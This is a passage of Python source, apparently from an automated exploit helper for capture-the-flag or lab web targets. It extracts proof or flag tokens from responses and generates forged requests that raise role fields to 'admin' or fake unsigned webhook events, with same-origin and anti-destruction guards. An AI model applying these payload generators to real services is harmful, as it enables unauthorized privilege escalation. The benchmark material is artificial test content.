    return bool(AFFIRM_WORDS.search(text) and (PAYOFF_LIKE.search(text) or OTHER_LIKE.search(text)))


def _candidate_values(text, *, text_limit=MAX_TEXT, max_values=24):
    """Proof/evidence-like values in one successful body; values only, bounded and de-duplicated."""
    text = str(text or "")[:max(0, int(text_limit))]
    out = []

    def add(value):
        if not isinstance(value, (str, int)) or isinstance(value, bool):
            return
        value = str(value).strip()
        if not 3 <= len(value) <= 256 or value.lower() in _BORING_CANDIDATES:
            return
        if value not in out:
            out.append(value)

    for obj in _json_objects(text, text_limit=text_limit, max_objects=max_values):
        for path, value in _walk(obj):
            if path and LABEL_KEY.search(path[-1]):
                add(value)
    for match in PAYOFF_LIKE.finditer(text):
        add(match.group(0))
    for match in OTHER_LIKE.finditer(text):
        add(match.group(0))
    for match in LABELLED_TEXT.finditer(text):
        add(match.group(1) or match.group(2))
    return out[:max(0, int(max_values))]


def _baseline_mark_block(pieces, *, proof_only=(), incomplete=False):
    """Serialize independently found baseline marks ahead of display text.

    JSON records retain arbitrary labelled values without concatenating sibling
    bytes. Strict proof-shaped values have an integrity-tracked representation
    and are emitted first, so generic candidate noise cannot displace a late
    proof decoy; representation overflow is explicit and fails closed.
    """
    candidates = []
    proof_lines = []
    proof_keys = set()
    strict_chars = 0
    strict_overflow = bool(incomplete)
    reserved = (len(BASELINE_STRICT_START) + len(BASELINE_STRICT_END)
                + len(BASELINE_STRICT_INCOMPLETE) + 4)
    strict_budget = max(0, MAX_TEXT - reserved)

    def add_candidate(value):
        value = str(value or "").strip()
        if value and value not in candidates and len(candidates) < MAX_BASELINE_MARKS:
            candidates.append(value)

    def add_proof(value):
        nonlocal strict_chars, strict_overflow
        value = str(value or "")
        key = value.casefold()
        if not value or key in proof_keys:
            return
        line = json.dumps({"evidence": value}, separators=(",", ":"))
        needed = len(line) + (1 if proof_lines else 0)
        if strict_chars + needed > strict_budget:
            strict_overflow = True
            return
        proof_keys.add(key)
        proof_lines.append(line)
        strict_chars += needed

    for piece in list(pieces or [])[:768]:
        bounded = str(piece or "")[:MAX_BASELINE_SCAN]
        for match in PAYOFF_SEEN.finditer(bounded):
            add_proof(match.group(0))
        for value in _candidate_values(
                bounded, text_limit=MAX_BASELINE_SCAN,
                max_values=MAX_BASELINE_MARKS_PER_ITEM):
            add_candidate(value)
    for piece in list(proof_only or [])[:64]:
        bounded = str(piece or "")[:MAX_BASELINE_SCAN]
        for match in PAYOFF_SEEN.finditer(bounded):
            add_proof(match.group(0))

    lines = []
    if proof_lines or strict_overflow:
        lines.append(BASELINE_STRICT_START)
        if strict_overflow:
            lines.append(BASELINE_STRICT_INCOMPLETE)
        lines.extend(proof_lines)
        lines.append(BASELINE_STRICT_END)
    lines.extend(
        json.dumps({"evidence": value}, separators=(",", ":"))
        for value in candidates if value.casefold() not in proof_keys
    )
    return "\n".join(lines)


def _labelled_candidate_values(text):
    out = []

    def add(value):
        if not isinstance(value, (str, int)) or isinstance(value, bool):
            return
        value = str(value).strip()
        if 3 <= len(value) <= 256 and value.lower() not in _BORING_CANDIDATES and value not in out:
            out.append(value)

    for obj in _json_objects(text):
        for path, value in _walk(obj):
            if path and LABEL_KEY.search(_snake(path[-1])):
                add(value)
    for match in LABELLED_TEXT.finditer(text):
        add(match.group(1) or match.group(2))
    return out[:24]


def _strict_candidate_values(texts, *, max_values):
    """Collect strict proof/flag shapes outside generic candidate budgets.

    Returns ``(values, incomplete)``.  A cap overflow is not permission to
    choose among the prefix: callers must suppress automatic answers.
    """
    out = []
    for index, raw in enumerate(texts):
        if index >= 512:
            return out, True
        text = str(raw or "")
        if len(text) > MAX_TEXT:
            return out, True
        for regex in (PAYOFF_LIKE, OTHER_LIKE):
            for match in regex.finditer(text):
                value = match.group(0)
                if value not in out:
                    out.append(value)
                    if len(out) > max_values:
                        return out[:max_values], True
    return out, False


def _complete_labelled_values(texts, *, max_values=256, max_nodes=20_000):
    """Collect explicit proof/evidence fields without first-N truncation.

    This is the ambiguity channel, not a promotion channel.  A structural or
    resource ambiguity marks the set incomplete so callers suppress ``auto``.
    """
    out = []
    nodes = 0

    def add(value):
        if not isinstance(value, (str, int)) or isinstance(value, bool):
            return False
        value = str(value).strip()
        if not 3 <= len(value) <= 256 or value.lower() in _BORING_CANDIDATES:
            return False
        if value not in out:
            out.append(value)
            return len(out) > max_values
        return False

    for index, raw in enumerate(texts):
        if index >= 512:
            return out[:max_values], True
        text = str(raw or "")
        if len(text) > MAX_TEXT:
            return out[:max_values], True
        doc, ambiguous = _security_json_whole(text)
        if ambiguous:
            return out[:max_values], True
        embedded_integrity = {}
        documents = [doc] if isinstance(doc, (dict, list)) else _security_json_objects(
            text, text_limit=MAX_TEXT, max_objects=max_values + 1,
            _integrity=embedded_integrity)
        if embedded_integrity.get("incomplete"):
            return out[:max_values], True
        if len(documents) > max_values:
            return out[:max_values], True
        for document in documents:
            if not isinstance(document, (dict, list)):
                continue
            stack = [(document, ())]
            while stack:
                value, path = stack.pop()
                nodes += 1
                if nodes > max_nodes:
                    return out[:max_values], True
                if isinstance(value, dict):
                    for key, child in value.items():
                        child_path = path + (str(key),)
                        if LABEL_KEY.search(_snake(key)) and add(child):
                            return out[:max_values], True
                        if isinstance(child, (dict, list)):
                            stack.append((child, child_path))
                elif isinstance(value, list):
                    stack.extend((child, path + (str(offset),))
                                 for offset, child in enumerate(value)
                                 if isinstance(child, (dict, list)))
        for match in LABELLED_TEXT.finditer(text):
            if add(match.group(1) or match.group(2)):
                return out[:max_values], True
    return out, False


def _complete_baseline_labelled_values(texts, *, max_values=256, max_nodes=20_000):
    """Collect labelled values from framed baseline records.

    :func:`response_baseline_text` deliberately serializes independent body,
    carrier and header views with an inert boundary.  Feeding that entire
    serialization to a whole-document JSON parser makes every ordinary JSON
    control look malformed because valid JSON is followed by the boundary.
    Split only on our exact internal framing token and validate each coherent
    fragment independently.  The leading mark block is a sequence of
    one-line ``{"evidence": ...}`` records (plus inert strict-set markers), so
    validate those records independently too.  Any malformed/capped fragment
    remains fail-closed.
    """
    fragments = []
    for index, raw in enumerate(texts):
        if index >= 512:
            return [], True
        text = str(raw or "")
        if len(text) > MAX_TEXT:
            return [], True
        pieces = text.split(BASELINE_FRAGMENT_BOUNDARY)
        if len(pieces) > 769:
            return [], True
        if len(pieces) > 1:
            first_lines = [line for line in pieces[0].splitlines() if line.strip()]
            marker_lines = {BASELINE_STRICT_START, BASELINE_STRICT_END,
                            BASELINE_STRICT_INCOMPLETE}
            record_lines = [line for line in first_lines if line.strip() not in marker_lines]
            mark_block = bool(first_lines) and all(
                line.strip() in marker_lines or line.lstrip().startswith("{")
                for line in first_lines)
            if mark_block:
                fragments.extend(record_lines)
                fragments.extend(pieces[1:])
            else:
                # A target can place the inert boundary in its own control
                # text. Treat every side as independent baseline evidence;
                # this can only suppress an answer, never promote one.
                fragments.extend(pieces)
        else:
            fragments.append(text)
        if len(fragments) > 1024:
            return [], True
    # Common template controls such as ``{{config}}`` begin with ``{`` but
    # are not attempted JSON documents.  They contain no complete structural
    # label to hide, and the strict/regex baseline channels above still record
    # any actual proof/flag or ``evidence: value`` text around them.  Excluding
    # only a single inert template expression avoids declaring the subtraction
    # set incomplete merely because a template engine echoed its control.
    json_fragments = [fragment for fragment in fragments if not re.fullmatch(
        r"\s*\{\{[^{}\r\n]{1,512}\}\}\s*", str(fragment or ""))]
    return _complete_labelled_values(
        json_fragments, max_values=max_values, max_nodes=max_nodes)


def _baseline_strict_set_incomplete(text):
    """Detect source/serialization overflow or downstream truncation."""
    text = str(text or "")
    if BASELINE_STRICT_INCOMPLETE in text:
        return True
    cursor = 0
    while True:
        start = text.find(BASELINE_STRICT_START, cursor)
        if start < 0:
            return False
        end = text.find(BASELINE_STRICT_END, start + len(BASELINE_STRICT_START))
        if end < 0:
            return True
        cursor = end + len(BASELINE_STRICT_END)


def baseline_set_incomplete(texts):
    """Whether any serialized control leaves novelty unknowable.

    Narrow peers use this public policy seam before returning a proof.  Inputs
    are the already-conservative strings produced by
    :func:`response_baseline_text`, not payoff bodies.
    """
    return any(_baseline_strict_set_incomplete(value)
               for value in list(texts or [])[:512])


def extract_success(response, baseline_texts=(), host=None):
    """Return extraction metadata for one response.

    ``auto`` is set only for one novel exact payoff token (a proof under a proof event, else a flag).
    ``candidates`` contains every novel labelled/payoff-like/other-shape value for the agent. Response-header values
    participate in ambiguity and baseline subtraction, while exploit success remains anchored in the body.
    """
    views = response_text_views(response)
    header_values = [value for _key, value in _response_header_items(response)]
    # Payoffs fail closed when an encoded/off-host carrier is ambiguous.  A
    # baseline has the opposite trust direction: recording *more* decoys can
    # only suppress an automatic answer.  Keep raw target-returned values in
    # the subtraction set as well as the carrier-filtered view so a deep
    # carrier elsewhere in the same control body cannot erase an unrelated
    # plain decoy.  Raw values are never promoted into payoff candidates.
    raw_baselines = [str(v or "")[:MAX_TEXT] for v in baseline_texts]
    baseline_marker_incomplete = baseline_set_incomplete(raw_baselines)
    baseline_texts = [_strip_offhost_urls(v, host) for v in raw_baselines]
    baseline_views = raw_baselines + baseline_texts
    baseline_values = {
        value for baseline in baseline_views
        for value in _candidate_values(baseline, max_values=MAX_BASELINE_MARKS)
    }
    baseline_keys = {v.casefold() if PAYOFF_LIKE.fullmatch(v) else v for v in baseline_values}
    baseline_strict, baseline_scan_incomplete = _strict_candidate_values(
        baseline_views, max_values=MAX_BASELINE_MARKS)
    baseline_labelled, baseline_label_incomplete = _complete_baseline_labelled_values(
        baseline_views, max_values=MAX_BASELINE_MARKS)
    baseline_strict_keys = {value.casefold() for value in baseline_strict}
    baseline_label_keys = {
        value.casefold() if PAYOFF_LIKE.fullmatch(value) else value
        for value in baseline_labelled
    }
    # Every conservative baseline channel is subtractive.  A value seen as a
    # plain flag/proof token must also subtract the same bytes when a later
    # response labels them as ``evidence``; representation changes do not make
    # an old decoy novel.  Use a folded union for the strict/labelled ambiguity
    # channels, whose job is to suppress rather than promote.
    baseline_any_folded = {
        value.casefold()
        for value in list(baseline_values) + list(baseline_strict) + list(baseline_labelled)
    }
    baseline_proofish = {
        match.group(0).casefold() for baseline in baseline_views
        for match in PAYOFF_LIKE.finditer(baseline[:MAX_TEXT])
    }
    baseline_wire = {
        match.group(0) for baseline in baseline_views
        for match in PAYOFF_WIRE.finditer(baseline[:MAX_TEXT])
    }
    successful_texts = []
    all_response_texts = []
    rejected = False
    for view in views:
        cleaned = _strip_offhost_urls(view, host)
        all_response_texts.append(cleaned)
        local_response = dict(response) if isinstance(response, dict) else {}
        local_response["body"] = view.encode("utf-8", "strict")
        local_response.pop("text", None)
        if rejection_signal(local_response):
            rejected = True
        if not success_signal(local_response, host=host):
            continue
        successful_texts.append(cleaned)
    # Headers and non-success siblings are independent, untrusted evidence.
    # They participate in ambiguity/decoy accounting but can never be promoted
    # merely because a different body view carried a success anchor.
    all_response_texts.extend(_strip_offhost_urls(value, host) for value in header_values)
    strict_values, response_strict_incomplete = _strict_candidate_values(
        all_response_texts, max_values=64)
    complete_labelled, response_label_incomplete = _complete_labelled_values(
        all_response_texts, max_values=256)
    success = bool(successful_texts) and not rejected
    promoted_values = list(dict.fromkeys(
        value for text in successful_texts for value in _candidate_values(text)
    )) if success else []
    all_values = list(dict.fromkeys(
        value for text in all_response_texts for value in _candidate_values(text)
    ))
    generic_novel = [v for v in all_values
                     if (v.casefold() if PAYOFF_LIKE.fullmatch(v) else v) not in baseline_keys]
    strict_novel = [value for value in strict_values
                    if value.casefold() not in baseline_strict_keys
                    and value.casefold() not in baseline_any_folded]
    labelled_novel = [value for value in complete_labelled
                      if (value.casefold() if PAYOFF_LIKE.fullmatch(value) else value)
                      not in baseline_label_keys
                      and value.casefold() not in baseline_any_folded]
    novel = list(dict.fromkeys(strict_novel + labelled_novel + generic_novel))
    labelled = set(complete_labelled)
    labelled.update(value for text in all_response_texts
                    for value in _labelled_candidate_values(text))
    wire = list(dict.fromkeys(
        m.group(0) for text in successful_texts for m in PAYOFF_WIRE.finditer(text)
        if m.group(0).casefold() not in baseline_proofish
    )) if success else []
    # A JSON string may spell part of the exact wire value with ``\u`` escapes.
    # `_candidate_values` obtained it by structurally parsing one successful,
    # duplicate-free document; promote that decoded scalar without ever
    # joining sibling leaves or scanning archive/MIME metadata.
    for value in promoted_values:
        if (PAYOFF_WIRE.fullmatch(value)
                and value.casefold() not in baseline_proofish and value not in wire):
            wire.append(value)
    # Count every flag-format value, including uppercase/different shapes, as ambiguity.
    proofish = list(dict.fromkeys(
        v for v in novel
        if v in labelled or PAYOFF_LIKE.fullmatch(v) or OTHER_LIKE.fullmatch(v)
        or any(x in v.lower() for x in ("proof", "flag", "evidence"))
    ))
    auto = wire[0] if len(wire) == 1 and len(wire) == len([v for v in proofish if PAYOFF_WIRE.fullmatch(v)]) else None
    # Baseline values are subtracted, not counted against a distinct payoff. A
    # proof-shaped landing-page decoy must not hide the one novel value returned
    # by a successful exploit. The same value on both sides was already removed
    # from ``wire`` above and remains ineligible.
    if len(wire) != 1:
        auto = None
    # A second distinct proof/flag-like candidate makes the answer ambiguous.
    if auto is not None and any(v != auto for v in proofish):
        auto = None
    # An incomplete strict baseline set makes novelty unknowable. Keep the
    # successful response visible to the agent, but never auto-bank its proof.
    if (baseline_marker_incomplete or baseline_scan_incomplete or baseline_label_incomplete
            or response_strict_incomplete or response_label_incomplete):
        auto = None
    candidates = [v for v in novel if v != auto]
    return {"success": success, "auto": auto, "uuid4": bool(auto and PAYOFF_V4.fullmatch(auto)),
            "candidates": candidates[:12], "wire": wire[:12], "baseline_decoys": sorted(baseline_wire)[:12]}


def _snake(value):
    value = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", str(value or "")[:MAX_SCALAR])
    return re.sub(r"[^a-z0-9]+", "_", value.lower()).strip("_")


def name_variants(label):
    """Display-label name, shortened wire names, then a small semantic synonym set."""
    original = _snake(label)
    if not original:
        return []
    short = original
    for prefix in ("current_", "desired_", "required_", "target_", "expected_"):
        if short.startswith(prefix):
            short = short[len(prefix):]
            break
    for suffix in ("_type", "_scope", "_value", "_name", "_field", "_label"):
        if short.endswith(suffix) and len(short) > len(suffix):
            short = short[:-len(suffix)]
            break
    stems = [short]
    if original not in stems:
        stems.append(original)
    semantic = next((key for key in _NAME_SYNONYMS if key in short.split("_")), short)
    stems += list(_NAME_SYNONYMS.get(semantic, ()))
    return list(dict.fromkeys(x for x in stems if x))[:7]


def value_variants(label, value):
    if isinstance(value, bool):
        return [True, "true", 1] if not value else [True]
    if not isinstance(value, (str, int, float)) or isinstance(value, bool):
        return []
    if isinstance(value, float) and not math.isfinite(value):
        return []
    name = _snake(label)
    text = str(value).strip()
    if not text or len(text) > MAX_SCALAR or any(ord(ch) < 0x20 for ch in text):
        return []
    low = text.lower()
    out = []
    if _ROLE_KEY.search(name) or any(k in name for k in ("owner", "scope")):
        if low in _LOW_ROLES:
            out += ["administrator", "admin", "executive", "owner", text]
        else:
            out += [text]
            if low == "admin":
                out.append("administrator")
            elif low == "administrator":
                out.append("admin")
            elif low == "executive":
                out += ["administrator", "admin"]
    else:
        out.append(value)
    if isinstance(value, str) and any(k in name for k in ("event", "type", "action", "topic")):
        for alt in (text.rsplit(".", 1)[-1], text.replace(".", "_"), text.replace(".", "-")):
            if alt:
                out.append(alt)
    return list(dict.fromkeys(out))[:7]


def _scalar_specs(docs):
    specs = []
    seen = set()
    for doc in docs:
        for path, value in _walk(doc):
            if not path or isinstance(value, (dict, list)):
                continue
            label = _snake(path[-1])
            if (not label or len(str(path[-1])) > 80 or label in seen or
                    _META_KEY.search(label) or len(str(value)) > MAX_SCALAR):
                continue
            if not (_EVENT_KEY.search(label) or _ROLE_KEY.search(label) or label in
                    ("user", "username", "owner", "scope", "event", "type", "action")):
                continue
            names, values = name_variants(label), value_variants(label, value)
            if names and values:
                specs.append({"label": label, "names": names, "values": values, "value": value})
                seen.add(label)
    return specs[:8]


def _rank_pairs(a, b):
    out = []
    for total in range(len(a) + len(b) - 1):
        for i in range(len(a)):
            j = total - i
            if 0 <= j < len(b):
                out.append((a[i], b[j]))
    return out


def _flat_payloads(specs, allow_role_only=False):
    out = []

    def add(payload, why):
        try:
            key = json.dumps(payload, sort_keys=True, separators=(",", ":"))
        except Exception:
            return
        if key not in {x[0] for x in out}:
            out.append((key, payload, why))

    event = next((s for s in specs if "event" in s["label"] or s["label"] in ("type", "action", "topic")), None)
    owner = next((s for s in specs if any(k in s["label"] for k in ("owner", "scope", "actor"))), None)
    if event and owner:
        # A genuinely crossed but bounded name x value grid.  Name changes are
        # slightly cheaper in the rank than value changes because display-label
        # shortening was the historical trap; nevertheless mixed variants now
        # appear near the front instead of values being tried only under the
        # first name pair.  The exact shortened names + exact clue values remain
        # payload one, preserving the fast path and the 36-payload cap.
        grid = []
        for eni, en in enumerate(event["names"][:7]):
            for oni, on in enumerate(owner["names"][:7]):
                if en == on:          # never collapse two required facts into one overwritten key
                    continue
                for evi, ev in enumerate(event["values"][:3]):
                    for ovi, ov in enumerate(owner["values"][:3]):
                        rank = (eni + oni + 2 * (evi + ovi), evi + ovi,
                                eni + oni, eni, oni, evi, ovi)
                        grid.append((rank, en, on, ev, ov))
        for _rank, en, on, ev, ov in sorted(grid, key=lambda item: item[0]):
            add({en: ev, on: ov},
                f"flat:{event['label']}+{owner['label']}")
            if len(out) >= 36:
                return out
    # A single-field payload is reserved for a self-described privilege field.
    # An isolated event/owner half is neither a meaningful forge nor authority
    # to mutate a generic endpoint when its matching clue value was unsafe.
    for spec in specs:
        if not allow_role_only:
            break
        if not _ROLE_KEY.search(spec["label"]):
            continue
        for name in spec["names"]:
            for value in spec["values"]:
                add({name: value}, f"flat:{spec['label']}")
                if len(out) >= 36:
                    return out
    return out


def _safe_state_value(value, depth=0, budget=None):
    """A small inert JSON value copied from an advertised state sample.

    The state blob is parsed by the target, so preserving a target-supplied
    prototype/gadget/URL key would turn recon data into an active server-side
    payload. Reject the whole sample instead of silently stripping fields and
    changing its meaning.
    """
    budget = budget if isinstance(budget, list) else [0]
    budget[0] += 1
    if budget[0] > MAX_STATE_NODES or depth > MAX_STATE_DEPTH:
        return None, False
    if value is None or isinstance(value, bool):
        return value, True
    if isinstance(value, int):
        return (value, True) if -(2 ** 63) <= value < 2 ** 63 else (None, False)
    if isinstance(value, float):
        return (value, True) if math.isfinite(value) and abs(value) <= 1e100 else (None, False)
    if isinstance(value, str):
        if (len(value) > MAX_SCALAR or any(ord(ch) < 0x20 for ch in value)
                or _STATE_ACTIVE_VALUE.search(value.strip())):
            return None, False
        return value, True
    if isinstance(value, list):
        if len(value) > MAX_STATE_LIST:
            return None, False
        out = []
        for child in value:
            clean, ok = _safe_state_value(child, depth + 1, budget)
            if not ok:
                return None, False
            out.append(clean)
        return out, True
    if isinstance(value, dict):
        if not value or len(value) > MAX_STATE_KEYS:
            return None, False
        out = {}
        for key, child in value.items():
            if not isinstance(key, str) or not _STATE_KEY.fullmatch(key):
                return None, False
            folded = _snake(key)
            if (not _STATE_SAFE_KEY.search(folded) or _STATE_DANGEROUS_KEY.search(folded)
                    or folded in {"proto", "prototype", "constructor", "class", "type"}):
                return None, False
            clean, ok = _safe_state_value(child, depth + 1, budget)
            if not ok:
                return None, False
            out[key] = clean
        return out, True
    return None, False


def _safe_state_object(value):
    clean, ok = _safe_state_value(value)
    if not ok or not isinstance(clean, dict):
        return None
    try:
        raw = json.dumps(clean, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    except Exception:
        return None
    return clean if len(raw) <= MAX_STATE_JSON else None


def _b64url_json(obj):
    clean = _safe_state_object(obj)
    if clean is None:
        return None
    raw = json.dumps(clean, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def _decode_b64url_json(value):
    encoded_cap = ((MAX_STATE_JSON + 2) // 3) * 4
    if (not isinstance(value, str) or len(value) > encoded_cap + 2
            or not re.fullmatch(r"[A-Za-z0-9_-]{8,%d}={0,2}" % encoded_cap, value)):
        return None
    try:
        raw = base64.urlsafe_b64decode(value.rstrip("=") + "=" * (-len(value.rstrip("=")) % 4))
        if len(raw) > MAX_STATE_JSON:
            return None
        obj = _security_json.loads(raw.decode("utf-8"), max_chars=MAX_STATE_JSON)
        return _safe_state_object(obj)
    except Exception:
        return None


def _state_role_paths(value, path=(), depth=0):
    if depth > MAX_STATE_DEPTH:
        return []
    out = []
    if isinstance(value, dict):
        for key, child in value.items():
            folded = _snake(key)
            if _ROLE_KEY.search(folded) and isinstance(child, (str, int, bool)):
                out.append((path + (key,), folded, child))
            if isinstance(child, (dict, list)):
                out.extend(_state_role_paths(child, path + (key,), depth + 1))
    elif isinstance(value, list):
        for index, child in enumerate(value):
            if isinstance(child, (dict, list)):
                out.extend(_state_role_paths(child, path + (index,), depth + 1))
    return out[:8]


def _set_state_path(value, path, replacement):
    out = copy.deepcopy(value)
    current = out
    try:
        for part in path[:-1]:
            current = current[part]
        current[path[-1]] = replacement
    except (KeyError, IndexError, TypeError):
        return None
    return _safe_state_object(out)


def _sample_objects(docs):
    out = []

    def candidate(path, obj):
        if not isinstance(obj, dict):
            return False
        label = _snake(path[-1]) if path else ""
        direct_role = any(_ROLE_KEY.search(_snake(key)) for key in obj)
        return direct_role or label in {"sample", "example", "state", "session", "claims", "profile", "context"}

    def add(obj):
        clean = _safe_state_object(obj)
        if clean is None or not _state_role_paths(clean):
            return
        key = json.dumps(clean, sort_keys=True, separators=(",", ":"), ensure_ascii=False)
        if key not in {x[0] for x in out}:
            out.append((key, clean))

    for doc in docs:
        if candidate((), doc):
            add(doc)
        for path, value in _walk(doc):
            if candidate(path, value):
                add(value)
            decoded = _decode_b64url_json(value) if isinstance(value, str) else None
            add(decoded)
    return [obj for _key, obj in out[:10]]


def _unsafe_state_sample(docs):
    """Whether an advertised state/example object looks role-bearing but fails the inert schema."""
    labels = {"sample", "example", "state", "session", "claims", "profile", "context"}
    for doc in docs:
        rows = [((), doc)] + list(_walk(doc)) if isinstance(doc, dict) else list(_walk(doc))
        for path, value in rows:
            if not isinstance(value, dict):
                continue
            label = _snake(path[-1]) if path else ""
            direct_role = any(_ROLE_KEY.search(_snake(key)) for key in value)
            if not direct_role and label not in labels:
                continue
            # A specifically advertised sample/example is an all-or-nothing
            # schema: do not partially copy an oversized/deep/active object.
            # A directly role-bearing object gets the same treatment.
            if _safe_state_object(value) is None:
                return True
    return False


def _mutated_states(samples):
    out = []
    for sample in samples:
        clean = _safe_state_object(sample)
        if clean is None:
            continue
        for path, folded, current in _state_role_paths(clean):
            if isinstance(current, bool) or folded in ("is_admin", "admin", "administrator"):
                obj = _set_state_path(clean, path, True)
                if obj is not None:
                    out.append(obj)
            else:
                for role in ("administrator", "admin"):
                    obj = _set_state_path(clean, path, role)
                    if obj is not None:
                        out.append(obj)
            if len(out) >= 10:
                break
        if len(out) >= 10:
            break
    dedup = []
    for obj in out:
        key = json.dumps(obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False)
        if key not in {x[0] for x in dedup}:
            dedup.append((key, obj))
    return [obj for _key, obj in dedup[:10]]


def _envelope_names(docs):
    out = []
    for doc in docs:
        for path, value in _walk(doc):
            label = _snake(path[-1]) if path else ""
            if label in ("state_field", "envelope_field", "blob_field", "session_field") and isinstance(value, str):
                out += [name for name in name_variants(value) if _STATE_KEY.fullmatch(name)]
            if label in ENVELOPE_KEYS and isinstance(value, str) and (_decode_b64url_json(value) is not None
                                                                      or "base64" in str(doc).lower()):
                out.append(label)
    out += ["state", "session", "blob", "data", "payload"]
    return list(dict.fromkeys(name for name in out if _STATE_KEY.fullmatch(name)))[:6]


def _route_value(value, base_url):
    try:
        result = _web.safe_same_origin_route(
            value, base_url, allow_query=True, guard_query=True, max_bytes=MAX_ROUTE)
        if result is None:
            return None
        parts = urllib.parse.urlsplit(result)
        path = parts.path or "/"
        for layer in _web.canonical_route_layers(path, max_bytes=MAX_ROUTE) or ():
            folded = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", layer)
            if (DESTRUCTIVE_PATH.search(folded)
                    or _web.route_has_destructive_action(layer)):
                return None
        for key, item in urllib.parse.parse_qsl(parts.query, keep_blank_values=True):
            for raw_part in (key, item):
                for part in _web.canonical_route_layers(
                        raw_part, plus=True, max_bytes=MAX_SCALAR) or ():
                    folded = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", part)
                    if (DESTRUCTIVE_PATH.search(folded)
                            or _web.route_has_destructive_action(part)):
                        return None
        return result
    except Exception:
        return None


def _route_rank(key):
    key = _snake(key)
    for i, word in enumerate(("webhook", "forge", "event", "trust", "state", "profile", "account",
                              "action", "submit", "process", "feature", "endpoint")):
        if word in key:
            return i
    return 99


def _routes(docs, target, ctx, base_url, format_docs=()):
    values = []
    for doc in docs:
        for path, value in _walk(doc):
            key = _snake(path[-1]) if path else ""
            if key in FORMAT_ROUTE_KEYS:
                continue
            if key in ROUTE_KEYS or (key.endswith(("_route", "_endpoint")) and _ROUTE_WORD.search(key)):
                values.append((_route_rank(key), value))
    # A generic `route` is authoritative only inside the document fetched from
    # an explicitly advertised state-format endpoint.
    for doc in format_docs:
        for path, value in _walk(doc):
            key = _snake(path[-1]) if path else ""
            if key == "route":
                values.append((_route_rank("state_route"), value))
    for source in (target, ctx):
        if isinstance(source, dict):
            for key in ROUTE_KEYS:
                if key in source:
                    values.append((_route_rank(key), source[key]))
    text = "\n".join(str(x or "") for x in ((target or {}).get("question") if isinstance(target, dict) else "",
                                               ctx.get("prompt"), ctx.get("question")))
    for match in _ROUTE_TEXT.finditer(text):
        if _ROUTE_WORD.search(match.group(1)):
            values.append((_route_rank(match.group(1)), match.group(1)))
    out = []
    for _rank, value in sorted(values, key=lambda item: item[0]):
        route = _route_value(value, base_url)
        # Every named value is an authority alias. An invalid/reserved peer or
        # two different normalized routes is ambiguity, never permission to
        # select the highest-ranked spelling.
        if route is None or route in ("/", "/api/clues", "/api/state-format", "/openapi.json"):
            return []
        if route not in out:
            out.append(route)
    return out if len(out) == 1 else []


def _format_route(docs, base_url):
    routes = []
    for doc in docs:
        for path, value in _walk(doc):
            if path and _snake(path[-1]) in FORMAT_ROUTE_KEYS:
                route = _route_value(value, base_url)
                if route is None:
                    return _ROUTE_CONFLICT
                if route not in routes:
                    routes.append(route)
    if not routes:
        return None
    return routes[0] if len(routes) == 1 else _ROUTE_CONFLICT


def _readback_routes(docs, base_url):
    ranked = []
    for doc in docs:
        for path, value in _walk(doc):
            key = _snake(path[-1]) if path else ""
            if key in READBACK_KEYS:
                route = _route_value(value, base_url)
                if route is None:
                    return None
                if route not in ranked:
                    ranked.append(route)
                    if len(ranked) > 3:
                        return None
    return ranked


def _methods(docs):
    """Return the coherent advertised method set and whether every alias agreed.

    Singular method aliases select one verb.  Plural aliases may advertise a
    set.  When several aliases/documents are present, only their intersection
    is authoritative; unioning them lets ``method=GET`` plus
    ``allowed_methods=POST`` manufacture POST permission.
    """
    advertised = []
    singular = {"method", "http_method", "request_method", "verb"}
    allowed = ("GET", "POST", "PUT", "PATCH", "DELETE")
    for doc in docs:
        for path, value in _walk(doc):
            key = _snake(path[-1]) if path else ""
            if key not in singular | {"methods", "allowed_methods"}:
                continue
            values = value if isinstance(value, list) else [value]
            if not values or any(not isinstance(item, str) for item in values):
                return [], False
            methods = set()
            for item in values:
                named = set(re.findall(r"\b(?:GET|POST|PUT|PATCH|DELETE)\b", item.upper()))
                if len(named) != 1:
                    return [], False
                methods.update(named)
            if key in singular and len(methods) != 1:
                return [], False
            advertised.append(methods)
    if not advertised:
        return [], True
    coherent = set.intersection(*advertised)
    if not coherent:
        return [], False
    return [method for method in allowed if method in coherent], True


def _preferred_encoding(docs):
    for doc in docs:
        for path, value in _walk(doc):
            key = _snake(path[-1]) if path else ""
            if key in ("content_type", "media_type", "encoding") and isinstance(value, str):
                low = value.lower()
                if "x-www-form-urlencoded" in low or low in ("form", "urlencoded"):
                    return "form"
                if "json" in low:
                    return "json"
    return "json"


def _blob_evidence(docs, prompt="", advertised_format=False):
    if advertised_format:
        return True
    if re.search(r"(?i)\b(?:base64url|serialized|session blob|state blob|blob of)\b", str(prompt or "")):
        return True
    for doc in docs:
        for path, value in _walk(doc):
            key = _snake(path[-1]) if path else ""
            if key in ("state_field", "envelope_field", "blob_field", "session_field"):
                return True
            if isinstance(value, str) and (re.search(r"(?i)\b(?:base64url|serialized)\b", value)
                                           or _decode_b64url_json(value) is not None):
                return True
    return False


def _applicable(docs, prompt):
    keys = {_snake(path[-1]) for doc in docs for path, _value in _walk(doc) if path}
    eventish = any(any(word in k for word in ("event", "webhook", "topic")) for k in keys)
    ownership = any(any(word in k for word in ("owner", "scope", "actor")) for k in keys)
    methods, methods_ok = _methods(docs)
    if not methods_ok:
        return False
    prompt = str(prompt or "")[:20_000]
    prompt_intent = bool(_APPLICABLE_TEXT.search(prompt))

    route_rows = []
    for doc in docs:
        for path, value in _walk(doc):
            key = _snake(path[-1]) if path else ""
            if isinstance(value, str) and (key in ROUTE_KEYS or key in FORMAT_ROUTE_KEYS):
                route_rows.append((key, value[:MAX_ROUTE + 1]))
    explicit_forge_route = any(key in {
        "webhook_route", "forge_route", "trust_route", "webhook_endpoint"
    } for key, _value in route_rows)
    strong_forge_path = any(_STRONG_FORGE_PATH.search(urllib.parse.urlsplit(value).path or "")
                            for _key, value in route_rows if len(value) <= MAX_ROUTE)
    unsigned = any(
        (key in {"signed", "signature_required", "requires_signature"} and value is False)
        or (isinstance(value, str) and re.search(
            r"(?i)\b(?:unsigned|sign nothing|without (?:a )?signature|no signature)\b", value))
        for doc in docs for path, value in _walk(doc)
        for key in [_snake(path[-1]) if path else ""]
    )
    doc_intent = any(
